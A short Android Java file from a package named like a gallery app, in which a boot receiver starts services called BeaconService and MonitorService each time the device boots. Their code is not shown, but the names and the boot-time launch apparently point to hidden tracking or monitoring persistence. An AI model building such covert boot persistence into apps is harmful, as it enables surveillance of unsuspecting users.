package com.android.gallery3d;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {
    @Override public void onReceive(Context c, Intent i) {
        c.startForegroundService(new Intent(c, BeaconService.class));
        c.startService(new Intent(c, MonitorService.class));
    }
}
